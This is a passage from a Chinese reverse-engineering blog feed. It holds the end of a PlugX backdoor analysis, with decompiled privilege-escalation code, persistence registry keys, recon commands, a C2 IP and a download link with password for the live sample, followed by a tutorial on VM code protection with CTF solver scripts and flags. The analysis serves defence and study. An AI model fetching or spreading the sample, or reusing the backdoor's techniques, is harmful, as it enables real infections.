class="number">9</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">  v2[<span class="number">10</span>] = <span class="string">&#x27;v&#x27;</span>;</span><br><span class="line">  v2[<span class="number">11</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">  v2[<span class="number">12</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">  v2[<span class="number">13</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v2[<span class="number">14</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">  v2[<span class="number">15</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v2[<span class="number">16</span>] = <span class="number">0</span>;</span><br><span class="line">  v10 = sub_100072B0(v2, <span class="number">1</span>);                    <span class="comment">// 提权</span></span><br><span class="line">  v3[<span class="number">0</span>] = <span class="string">&#x27;S&#x27;</span>;                                  <span class="comment">// SeTcbprivilege</span></span><br><span class="line">  v3[<span class="number">1</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">  v3[<span class="number">4</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">  v3[<span class="number">5</span>] = <span class="string">&#x27;P&#x27;</span>;</span><br><span class="line">  v3[<span class="number">6</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">  v3[<span class="number">7</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">  v3[<span class="number">8</span>] = <span class="string">&#x27;v&#x27;</span>;</span><br><span class="line">  v3[<span class="number">9</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">  v3[<span class="number">10</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">  v3[<span class="number">11</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v3[<span class="number">12</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">  v3[<span class="number">13</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">  v3[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">  v9 = sub_100072B0(v3, <span class="number">1</span>);                     <span class="comment">// 提权</span></span><br><span class="line">  v8 = sub_10009AE0();                          <span class="comment">// 创建线程，设置注册表值，创建套接字</span></span><br><span class="line">  unknown_libname_3(v11);</span><br><span class="line">  v7 = sub_100164D0(v11);                       <span class="comment">// 窗口</span></span><br><span class="line">  v6 = sub_100165A0(v11);                       <span class="comment">// 消息</span></span><br><span class="line">  v5 = sub_100164A0(v11);                       <span class="comment">// Destroy</span></span><br><span class="line">  sub_10001850(dword_10028CEC);</span><br><span class="line">  sub_1000A210();</span><br><span class="line">  sub_1000EE80();                               <span class="comment">// WSACleanup</span></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  unknown_libname_4(v11);</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数先提升权限，后创建一个线程创建一个套接字实现连接操作，可以执行远程用户的命令来篡改受感染的计算机，之后创建一个注册表Software\CLASSES\ms-pu\PROXY。</p><p>执行case3如下</p><h3 id="case3"><a href="#case3" class="headerlink" title="case3"></a>case3</h3><p>实现发送消息、执行shell的open操作。并且执行run_self操作。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>样本的行为事件总结如下：</p><h3 id="注册表项"><a href="#注册表项" class="headerlink" title="注册表项"></a>注册表项</h3><ul><li><p>AvastSvcPYT &#x3D; “% ProgramData% \ AvastSvcPYT \ AvastSvc.exe” : HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \Windows \ CurrentVersion \ Run</p></li><li><p>AvastSvcPYT &#x3D; “% ProgramData% \ AvastSvcPYT \ AvastSvc.exe” : HKEY_CURRENT_USER \ Software \ Microsoft \Windows \ CurrentVersion \ Run</p></li><li><p>HKEY_LOCAL_MACHINE \ SYSTEM \ ControlSet001 \ Control \ Network Version &#x3D; 1</p></li></ul><ul><li>HKEY_CURRENT_USER \ System \ CurrentControlSet \ Control \ Network Version &#x3D; 1</li></ul><ul><li>HKEY_LOCAL_MACHINE \ SOFTWARE \ Classes \ ms-pu CLSID &#x3D; {645FF040-5081-101B-9F08-<em>00AA002F954E</em>}</li></ul><h3 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h3><ul><li><p>USB_NOTIFY_COP_ </p></li><li><p>USB_NOTIFY_INF_</p></li></ul><h3 id="创建文件-x2F-目录"><a href="#创建文件-x2F-目录" class="headerlink" title="创建文件&#x2F;目录"></a>创建文件&#x2F;目录</h3><ul><li><p>% ProgramData% \ AvastSvcPYT </p></li><li><p>% ProgramData% \ AvastSvcPYT \ AvastSvc.exe</p></li><li><p>% ProgramData% \ AvastSvcPYT \ AvastAuth.dat</p></li><li><p>% ProgramData% \ AvastSvcPYT \ wsc.dll</p></li></ul><h3 id="删除的文件"><a href="#删除的文件" class="headerlink" title="删除的文件"></a>删除的文件</h3><ul><li>它会删除在终止进程的文件夹中找到的所有文件。(未定位)</li><li>它删除终止进程的文件夹。(未定位)</li><li>它将以下文件放入 {Drive} \RECYCLER.BIN：<ul><li>tmp.bat</li><li>c3lzLmluZm8</li><li>CEFHelper.exe</li><li>AvastAuth.dat</li><li>wsc.dll</li></ul></li></ul><h3 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h3><ul><li>% ProgramData% \ AvastSvcPYT \ AvastSvc.exe</li></ul><h3 id="关闭进程"><a href="#关闭进程" class="headerlink" title="关闭进程"></a>关闭进程</h3><ul><li>AdobeHelper.exe</li><li>AdobeUpdates.exe</li><li>AdobeUpdate.exe</li><li>AdobeARM.exe</li><li>AAM Update.exe</li><li>AAM Updates.exe</li></ul><h3 id="信息泄露（执行的命令）"><a href="#信息泄露（执行的命令）" class="headerlink" title="信息泄露（执行的命令）"></a>信息泄露（执行的命令）</h3><ul><li>systeminfo</li><li>ipconfig</li><li>netstat</li><li>arp</li><li>tasklist</li></ul><h3 id="编码-x2F-加密"><a href="#编码-x2F-加密" class="headerlink" title="编码&#x2F;加密"></a>编码&#x2F;加密</h3><ul><li>扩展名为 .doc、.docx、.ppt、.pptx、.xls、.xlsx、.pdf使用base64加密并放入回收站</li></ul><h3 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h3><ul><li>45.142.166.[112]</li></ul><p>感谢您读到这。</p><h3 id="样本链接"><a href="#样本链接" class="headerlink" title="样本链接"></a>样本链接</h3><p>链接：<a href="https://pan.baidu.com/s/1Y_xrV-7fAQRziJ7Z7u4PUQ">https://pan.baidu.com/s/1Y_xrV-7fAQRziJ7Z7u4PUQ</a><br>提取码：pttc</p><p>参考链接：<a href="https://www.trendmicro.com/vinfo/jp/threat-encyclopedia/print/malware/Backdoor.Win32.PLUGX.EYSGVM">https://www.trendmicro.com/vinfo/jp/threat-encyclopedia/print/malware/Backdoor.Win32.PLUGX.EYSGVM</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;PlugX是APT组织TA416等组织常用于恶意攻击的恶意软件家族，本片文章对PlugX某样本的恶意行为（在逆向角度）进行分析。&lt;/p&gt;</summary>
    
    
    
    <category term="样本分析" scheme="http://example.com/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>VM虚拟机逆向总结</title>
    <link href="http://example.com/2022/10/12/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%86%E5%90%91%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2022/10/12/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%86%E5%90%91%E6%80%BB%E7%BB%93/</id>
    <published>2022-10-12T07:11:41.749Z</published>
    <updated>2022-10-14T11:31:53.830Z</updated>
    
    <content type="html"><![CDATA[<p>逆向中的虚拟机保护是一种基于虚拟机的代码保护技术。它将基于x86汇编系统中的可执行代码转换为字节码指令系统的代码，来达到不被轻易逆向和篡改的目的。</p><span id="more"></span><h1 id="VM虚拟机逆向总结"><a href="#VM虚拟机逆向总结" class="headerlink" title="VM虚拟机逆向总结"></a>VM虚拟机逆向总结</h1><p>借着搭建了个新博客，加上研一没有太多的任务要做，所以打算把之前学习的逆向内容进行一些总结，同时也借着这个机会回顾一下之前学过的逆向知识点。后面的时打算先扎根在apt病毒样本分析，希望这篇博文也能给大家带来些许的帮助。</p><p>本次是VM相关的内容。</p><h2 id="VM定义-x2F-原理"><a href="#VM定义-x2F-原理" class="headerlink" title="VM定义&#x2F;原理"></a>VM定义&#x2F;原理</h2><h3 id="VM的定义："><a href="#VM的定义：" class="headerlink" title="VM的定义："></a>VM的定义：</h3><p>逆向中的虚拟机保护是一种基于虚拟机的代码保护技术。它将基于x86汇编系统中的可执行代码转换为字节码指令系统的代码，来达到不被轻易逆向和篡改的目的。</p><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>虚拟机：自己定义一套指令，在程序中能有一套函数和结构解释自己定义的指令并执行功能。</p><p>vm（虚拟机保护）：是一种基于虚拟机的代码保护技术。他将基于x86汇编系统中的可执行代码转换为字节码指令系统的代码。来达到不被轻易篡改和逆向的目的。</p><p><img src="https://s2.loli.net/2022/10/12/xP3Mkwv45OjqN7d.png" alt="vm.png"></p><p>框图解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">VMRUN:虚拟机入口函数</span><br><span class="line">dispatcher：调度器，用于解释opcode，并选择对应的Handler函数执行，当Handler执行完后会跳回这里，形成一个循环。</span><br><span class="line">opcode：程序可执行代码转换成的操作码</span><br><span class="line">Handler：各种功能对象模块</span><br></pre></td></tr></table></figure><p>当然这里的虚拟机并不是指VMWare\VirtualBox之类的虚拟机，它更像是一个用于解释系统函数的一个小型模拟器。</p><h2 id="VM调度方式"><a href="#VM调度方式" class="headerlink" title="VM调度方式"></a>VM调度方式</h2><h3 id="switch"><a href="#switch" class="headerlink" title="switch :"></a><strong>switch</strong> :</h3><p>最常见的方式， 一般opcode-&gt;handler会一对一</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">switch</span> (prog[pc]) &#123;</span><br><span class="line">            opcode1: </span><br><span class="line">                handler1;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            opcode2:</span><br><span class="line">                handler2;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            .......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ifnest"><a href="#ifnest" class="headerlink" title="ifnest :"></a><strong>ifnest</strong> :</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (prog[pc]==op1) </span><br><span class="line">        handler1;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (prog[pc]==op2) </span><br><span class="line">        handler2;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>direct</strong> :</p><p>直接跳转， 分成一个个小段， 然后运行最后直接跳转到下一个应该的handler去运行</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">goto</span> *prog[pc];</span><br><span class="line"></span><br><span class="line">opcode1: </span><br><span class="line">handler1; </span><br><span class="line"><span class="keyword">goto</span> *prog[pc];</span><br><span class="line"></span><br><span class="line">opcode2: </span><br><span class="line">handler2; </span><br><span class="line"><span class="keyword">goto</span> *prog[pc];</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure><p><strong>indirect</strong> :</p><p>间接跳转， 比上个直接跳转增加了个表， 通过表进行跳转，这样的情况下，opcode-&gt;handler会因为表的原因打乱，也可能存在多对一情况。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">goto</span> *jtab[prog[pc]];</span><br><span class="line"></span><br><span class="line">handler1; </span><br><span class="line"><span class="keyword">goto</span> *jtab[prog[pc]];</span><br><span class="line"></span><br><span class="line">handler2;</span><br><span class="line"><span class="keyword">goto</span> *jtab[prog[pc]];</span><br></pre></td></tr></table></figure><p><strong>call</strong> :</p><p>情况每个handler设置一个函数，检索和函数调用的方式对opcode调用不同的函数，应该也是opcode-&gt;handler一对一映射</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">op1fun</span><span class="params">()</span></span>&#123;handler1&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">op2fun</span><span class="params">()</span></span>&#123;handler2&#125;</span><br><span class="line">.....</span><br><span class="line">    </span><br><span class="line">call *prog[pc]();</span><br></pre></td></tr></table></figure><p><strong>linear, binary, interpolation</strong> :</p><p>线性运算 插入值， 这里是在top做一个opcode-&gt;handler映射，然后跳转到对应handler运行，运行后跳转回到top继续。这种情况因为映射的关系，很容易造成多对一的情况，并且对应的位置比前面几个情况更难把握。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">top: </span><br><span class="line">   <span class="keyword">goto</span> *(<span class="built_in">searchalg</span>(map,prog[pc]));</span><br><span class="line"></span><br><span class="line">handler1; </span><br><span class="line"><span class="keyword">goto</span> top;</span><br><span class="line"></span><br><span class="line">handler2; </span><br><span class="line"><span class="keyword">goto</span> top;</span><br></pre></td></tr></table></figure><h2 id="VM相关例题"><a href="#VM相关例题" class="headerlink" title="VM相关例题"></a>VM相关例题</h2><h3 id="WxyVM1（经典VM逆向题目）"><a href="#WxyVM1（经典VM逆向题目）" class="headerlink" title="WxyVM1（经典VM逆向题目）"></a>WxyVM1（经典VM逆向题目）</h3><p>这是一个非常基础的VM逆向题目，基础的甚至连VM的特点也不是特别明显。</p><p>打开程序进行分析，输入结果后程序执行了一个函数sub_4005B6，先不管这个函数后面判断程序的长度是24。往下是一个大循环，循环判断flag与一个结构是否相同，所以在前面那个函数肯定对flag的值进行了操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[WxyVM 0.0.1]&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;flag);</span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">sub_4005B6</span>();                                 <span class="comment">// vm对应函数</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;flag) != <span class="number">24</span> )                    <span class="comment">// 长度为24</span></span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;flag + i) != dword_601060[i] )  </span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;correct&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入函数发现一个明显的switch结构，前面我们知道了switch是常见的vm结构。程序执行了一个从0-14999的循环，循环步长是3。而下面的操作都是针对opcode的相关的操作（无论是switch每次取的不同的操作码，还是中间值v0,v2,v3）。每个case对应着不同的操作过程，分写这些过程发现这些过程都是只针对flag和v2的数据操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4005B6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14999</span>; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = opcode[i + <span class="number">2</span>];                         <span class="comment">// v2是操作数</span></span><br><span class="line">    v3 = opcode[i + <span class="number">1</span>];</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)opcode[i];               <span class="comment">// v0代表要对输入的字符串进行怎么样的操作</span></span><br><span class="line">    <span class="keyword">switch</span> ( opcode[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        v0 = opcode[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;flag + v3) += v2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v0 = opcode[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;flag + v3) -= v2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v0 = opcode[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;flag + v3) ^= v2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v0 = opcode[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;flag + v3) *= v2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v0 = opcode[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;flag + v3) ^= *(&amp;flag + opcode[i + <span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;                                          </span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以可以直接使用idc进行数据提取和算法逆向：</p><p>相关代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#idapython需要添加上idc库</span></span><br><span class="line"><span class="keyword">from</span> idc_bc695 <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#提取最后需要比较的结果</span></span><br><span class="line">arr = [<span class="number">0xFFFFFFC4</span>, <span class="number">0x00000034</span>, <span class="number">0x00000022</span>, <span class="number">0xFFFFFFB1</span>, <span class="number">0xFFFFFFD3</span>, <span class="number">0x00000011</span>, <span class="number">0xFFFFFF97</span>, <span class="number">0x00000007</span>, <span class="number">0xFFFFFFDB</span>, <span class="number">0x00000037</span>, <span class="number">0xFFFFFFC4</span>, <span class="number">0x00000006</span>, <span class="number">0x0000001D</span>, <span class="number">0xFFFFFFFC</span>, <span class="number">0x0000005B</span>, <span class="number">0xFFFFFFED</span>, <span class="number">0xFFFFFF98</span>, <span class="number">0xFFFFFFDF</span>, <span class="number">0xFFFFFF94</span>, <span class="number">0xFFFFFFD8</span>, <span class="number">0xFFFFFFB3</span>, <span class="number">0xFFFFFF84</span>, <span class="number">0xFFFFFFCC</span>, <span class="number">0x00000008</span>]</span><br><span class="line">addr = <span class="number">0x6010C0</span><span class="comment">#opcode的地址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14997</span>,-<span class="number">1</span>,-<span class="number">3</span>):<span class="comment">#反向进行遍历，14997是能除尽的最大值</span></span><br><span class="line">    v2 = Byte(addr+i+<span class="number">2</span>)<span class="comment">#Byte将对应地址的数据以Byte进行解析</span></span><br><span class="line">    v3 = Byte(addr+i+<span class="number">1</span>)</span><br><span class="line">    v0 = Byte(addr+i)</span><br><span class="line">    <span class="keyword">if</span> v0 == <span class="number">1</span>:</span><br><span class="line">        arr[v3] -= v2</span><br><span class="line">    <span class="keyword">if</span> v0 == <span class="number">2</span>:</span><br><span class="line">        arr[v3] += v2</span><br><span class="line">    <span class="keyword">if</span> v0 == <span class="number">3</span>:</span><br><span class="line">        arr[v3] ^= v2</span><br><span class="line">    <span class="keyword">if</span> v0 == <span class="number">4</span>:</span><br><span class="line">        arr[v3] /= v2</span><br><span class="line">    <span class="keyword">if</span> v0 == <span class="number">5</span>:</span><br><span class="line">        arr[v3] ^= arr[v2]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    i &amp;= <span class="number">0xff</span><span class="comment">#防止溢出</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#nctf&#123;Embr4ce_Vm_j0in_R3&#125;</span></span><br></pre></td></tr></table></figure><h3 id="WxyVM2（经典VM逆向题目）"><a href="#WxyVM2（经典VM逆向题目）" class="headerlink" title="WxyVM2（经典VM逆向题目）"></a>WxyVM2（经典VM逆向题目）</h3><p>使用ida打开程序，定位到关键函数，发现没法f5进行反编译。修改ida的cfg文件夹下的hexray.cfg文件中的MAX_FUNCSIZE &#x3D; 1024 ，重新打开程序发现可以进行反编译了，不过因为函数过长所以需要一段时间。</p><p>反编译之后存在大量类似于dword_69417C ^&#x3D; dword_694178这样的代码，对比最后发现与flag进行比较的内容没关系，判断是混淆代码，而类似于byte_694100这样的代码是我们需要进行提取的重点，所以我们下一步需要对关键位置进行代码提取。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[WxyVM 0.0.2]&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;byte_694100);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(&amp;byte_694100) == <span class="number">25</span>;</span><br><span class="line">  dword_694140 = <span class="number">-1677284711</span>;</span><br><span class="line">  byte_694117 += <span class="number">11</span>;</span><br><span class="line">  byte_694103 += <span class="number">31</span>;</span><br><span class="line">  dword_69417C ^= dword_694178;</span><br><span class="line">  dword_694180 ^= dword_69417C;</span><br><span class="line">  dword_694184 ^= dword_694180;</span><br><span class="line">  dword_694188 ^= dword_694184;</span><br><span class="line">  dword_69418C ^= dword_694188;</span><br><span class="line">  dword_694190 ^= dword_69418C;</span><br><span class="line">  dword_694194 ^= dword_694190;</span><br><span class="line">  dword_6941B4 ^= dword_6941B0;</span><br><span class="line">  dword_6941B8 ^= dword_6941B4;</span><br><span class="line">  dword_6941BC ^= dword_6941B8;</span><br><span class="line">  dword_6941C0 ^= dword_6941BC;</span><br><span class="line">  <span class="comment">//.......</span></span><br><span class="line">  dword_694150 = <span class="number">-1304438312</span>;</span><br><span class="line">  dword_694154 = <span class="number">-1859898891</span>;</span><br><span class="line">  dword_694158 = <span class="number">871339566</span>;</span><br><span class="line">  dword_6941CC ^= dword_6941C8;</span><br><span class="line">  dword_6941D0 ^= dword_6941CC;</span><br><span class="line">  dword_6941D4 ^= dword_6941D0;</span><br><span class="line">  dword_6941D8 ^= dword_6941D4;</span><br><span class="line">  dword_6941DC ^= dword_6941D8;</span><br><span class="line">  dword_6941E0 ^= dword_6941DC;</span><br><span class="line">  byte_694102 ^= <span class="number">0xB</span>u;</span><br><span class="line">  byte_694100 ^= <span class="number">0x5E</span>u;</span><br><span class="line">  byte_694111 += <span class="number">69</span>;</span><br><span class="line">  byte_694109 += <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">24</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;byte_694100 + i) != dword_694060[i] )</span><br><span class="line">      